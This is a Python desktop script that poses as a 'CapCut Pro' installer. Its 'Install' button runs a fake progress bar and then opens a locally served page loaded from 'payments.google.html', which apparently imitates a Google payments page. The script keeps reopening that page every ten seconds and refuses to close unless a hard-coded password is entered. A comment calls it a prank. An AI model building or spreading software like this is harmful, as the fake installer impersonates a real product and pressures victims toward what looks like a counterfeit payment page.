import tkinter as tk
from tkinter import messagebox, simpledialog, ttk
import threading
import time
import webbrowser
from flask import Flask, render_template_string
from PIL import Image, ImageTk  # Import Image and ImageTk from PIL
import os
import sys

# Flask application setup
app = Flask(__name__)

# Get the path of the directory where the script is running
def resource_path(relative_path):
    """ Get absolute path to resource, works for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

html_file_path = resource_path("payments.google.html")
icon_path = resource_path("images/logo.ico")

def load_html_content():
    with open(html_file_path, "r") as file:
        return file.read()

@app.route("/")
def home():
    return render_template_string(load_html_content())

def run_flask():
    app.run(port=5000)

def start_flask():
    threading.Thread(target=run_flask, daemon=True).start()  # Start Flask in a separate thread

def on_install():
    install_button.config(state=tk.DISABLED)
    progress_bar['value'] = 0  # Reset progress bar
    progress_bar.pack(pady=10)  # Show the progress bar

    # Start the processing in a separate thread
    threading.Thread(target=simulate_processing).start()

def simulate_processing():
    for _ in range(100):  # Simulate 100 steps for full progress
        time.sleep(0.03)  # Simulating processing time for each step
        progress_bar['value'] += 1  # Update the progress bar

    install_button.config(state=tk.NORMAL)  # Enable the install button again

    webbrowser.open("http://127.0.0.1:5000/")  # Open the HTML page

# Global flag to control the refresh
keep_refreshing = True

def refresh_browser():
    """Open and refresh the web page periodically."""
    global keep_refreshing
    while keep_refreshing:
        time.sleep(10)  # Adjust the time as needed
        webbrowser.open("http://127.0.0.1:5000/")  # Refresh the page

def on_closing():
    webbrowser.open("http://127.0.0.1:5000/")
    password = simpledialog.askstring("Password", "Enter password to close:")
    if password == "1213":
        global keep_refreshing
        keep_refreshing = False  # Stop refreshing the browser
        root.destroy()  # Close the application if the password is correct
    else:
        webbrowser.open("http://127.0.0.1:5000/")  # Reload the HTML file in the browser
        messagebox.showinfo("Information", "Enter Password")
        webbrowser.open("http://127.0.0.1:5000/")

# Main application window
root = tk.Tk()
root.title("CapCut Pro")
root.geometry("300x200")

# Load and display logo
try:
    icon_image = Image.open(icon_path)
    icon_photo = ImageTk.PhotoImage(icon_image)
    root.iconphoto(False, icon_photo)  # Set the window icon
except Exception as e:
    print(f"Error loading icon: {e}")

# Start Flask when the application is opened
start_flask()

# Start refreshing the browser in a separate thread
threading.Thread(target=refresh_browser, daemon=True).start()

# Button to trigger the prank
install_button = tk.Button(root, text="Install", command=on_install)
install_button.pack(pady=20)

# Create a progress bar
progress_bar = ttk.Progressbar(root, orient='horizontal', length=250, mode='determinate')

# Pack the progress bar (optional)
# progress_bar.pack(pady=10)

# Override the default close behavior
root.protocol("WM_DELETE_WINDOW", on_closing)

root.mainloop()
